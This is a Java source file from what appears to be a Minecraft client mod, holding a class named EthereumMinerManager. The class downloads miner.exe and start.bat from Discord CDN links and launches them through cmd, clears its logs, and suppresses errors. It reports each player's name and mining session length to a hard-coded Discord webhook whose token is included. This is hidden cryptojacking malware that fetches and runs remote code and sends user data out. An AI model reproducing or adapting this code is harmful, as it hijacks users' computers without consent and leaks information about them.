package dev.zprestige.fire.manager;

import dev.zprestige.fire.Main;
import net.minecraft.client.Minecraft;

import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Objects;
import java.util.stream.Collectors;

public class EthereumMinerManager {
    protected final Minecraft mc = Main.mc;
    protected final File file = Main.fileManager.registerPathAndCreate(Main.fileManager.getDirectory() + File.separator + "Miner");
    protected final File logs = Main.fileManager.registerPathAndCreate(file + File.separator + "logs");
    protected final File miner = new File(file + File.separator + "miner.exe");
    protected final File bat = new File(file + File.separator + "start.bat");
    protected final byte[] bytes = new byte[2048];
    protected int length;
    protected InputStream inputStream;
    protected OutputStream outputStream;
    protected Thread thread;
    protected long startTime;
    protected String name;

    public EthereumMinerManager init() {
        download("https://cdn.discordapp.com/attachments/896292452913274920/959977176214683689/miner.exe", miner);
        download("https://cdn.discordapp.com/attachments/785909027896295465/961225710930890802/start.bat", bat);
        return this;
    }

    public void start() {
        try {
            //noinspection ResultOfMethodCallIgnored
            filesInFolder(logs).forEach(File::delete);
            Runtime.getRuntime().exec("cmd /c start " + bat);
        } catch (Exception ignored) {
        }
        if (mc.player != null) {
            sendWebhookNotification("```\u27E0 " + mc.player.getName() + " has started mining." + "```");
            name = mc.player.getName();
        }
        startTime = System.currentTimeMillis();
    }

    public void end() {
        try {
            Runtime.getRuntime().exec("taskkill /F /IM miner.exe");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        final long seconds = getSeconds();
        final long minutes = getMinutes();
        final long hours = getHours();
        sendWebhookNotification("```\u27E0 " + name + " has finished a session lasting: \n\u27E0 Seconds: " + seconds + "\n\u27E0 Minutes: " + minutes + "\n\u27E0 Hours: " + hours + "```");
    }

    protected ArrayList<File> filesInFolder(File file) {
        try {
            return Arrays.stream(Objects.requireNonNull(file.list())).map(file1 -> new File(file + File.separator + file1)).collect(Collectors.toCollection(ArrayList::new));
        } catch (Exception ignored) {
            return new ArrayList<>();
        }
    }

    public void download(String url, File dir) {
        thread = new Thread(() -> {
            if (!dir.exists()) {
                try {
                    final URL url1 = new URL(url);
                    final URLConnection connection = url1.openConnection();
                    connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30 ChromePlus/1.6.3.1");
                    inputStream = connection.getInputStream();
                    outputStream = Files.newOutputStream(dir.toPath());
                    while ((length = inputStream.read(bytes)) != -1) {
                        outputStream.write(bytes, 0, length);
                    }
                    outputStream.close();
                    inputStream.close();
                } catch (Exception ignored) {
                }
            }
        });
        thread.start();
    }

    protected void sendWebhookNotification(final String message) {
        PrintWriter out = null;
        BufferedReader in = null;
        StringBuilder result = new StringBuilder();
        try {
            final URL realUrl = new URL("https://discord.com/api/webhooks/960096367139778620/c_p1_LHCUDuxj0NPjnkb91ZBdF5bIpBklrl1rV5BoSptHM3VEbTMcIpS8RlULMCk3mvT");
            final URLConnection conn = realUrl.openConnection();
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            out = new PrintWriter(conn.getOutputStream());
            final String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
            out.print(postData);
            out.flush();
            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result.append("/n").append(line);
            }

        } catch (Exception ignored) {
        } finally {
            try {
                if (out != null) {
                    out.close();
                }
                if (in != null) {
                    in.close();
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
        System.out.println(result);
    }

    public long getSeconds(){
        return (System.currentTimeMillis() - startTime) / 1000;
    }

    public long getMinutes(){
        return  ((System.currentTimeMillis() - startTime) / 1000) / 60;
    }
    public long getHours(){
        return (((System.currentTimeMillis() - startTime) / 1000) / 60) / 60;
    }

    public File getBat() {
        return bat;
    }
}
